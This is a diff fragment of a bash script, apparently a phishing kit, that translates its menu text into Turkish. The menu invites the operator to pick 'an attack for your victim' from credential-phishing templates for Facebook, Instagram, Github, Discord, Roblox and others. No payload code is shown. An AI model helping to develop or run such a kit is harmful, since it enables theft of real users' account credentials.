 			tunnel_menu;;
 		*)
-			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Geçersiz Seçenek, Tekrar Deneyin..."
 			{ sleep 1; clear; banner_small; site_vk; };;
 	esac
 }
 
-## Menu
+## Menü
 main_menu() {
 	{ clear; banner; echo; }
 	cat <<- EOF
-		${RED}[${WHITE}::${RED}]${ORANGE} Select An Attack For Your Victim ${RED}[${WHITE}::${RED}]${ORANGE}
+		${RED}[${WHITE}::${RED}]${ORANGE} Kurbanınız için bir saldırı seçin ${RED}[${WHITE}::${RED}]${ORANGE}
 
 		${RED}[${WHITE}01${RED}]${ORANGE} Facebook      ${RED}[${WHITE}11${RED}]${ORANGE} Twitch       ${RED}[${WHITE}21${RED}]${ORANGE} DeviantArt
 		${RED}[${WHITE}02${RED}]${ORANGE} Instagram     ${RED}[${WHITE}12${RED}]${ORANGE} Pinterest    ${RED}[${WHITE}22${RED}]${ORANGE} Badoo
@@ -752,11 +761,11 @@ main_menu() {
 		${RED}[${WHITE}31${RED}]${ORANGE} Mediafire     ${RED}[${WHITE}32${RED}]${ORANGE} Gitlab       ${RED}[${WHITE}33${RED}]${ORANGE} Github
 		${RED}[${WHITE}34${RED}]${ORANGE} Discord       ${RED}[${WHITE}35${RED}]${ORANGE} Roblox 
 
-		${RED}[${WHITE}99${RED}]${ORANGE} About         ${RED}[${WHITE}00${RED}]${ORANGE} Exit
+		${RED}[${WHITE}99${RED}]${ORANGE} Hakkında      ${RED}[${WHITE}00${RED}]${ORANGE} Çıkış
 
 	EOF
 	
-	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
+	read -p "${RED}[${WHITE}-${RED}]${GREEN} Bir seçenek seçin : ${BLUE}"
 
 	case $REPLY in 
 		1 | 01)
@@ -896,11 +905,12 @@ main_menu() {
 		0 | 00 )
 			msg_exit;;
 		*)
-			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Geçersiz Seçenek, Tekrar Deneyin..."
 			{ sleep 1; main_menu; };;
 	
 	esac
 }
+
 
 ## Main
 kill_pid
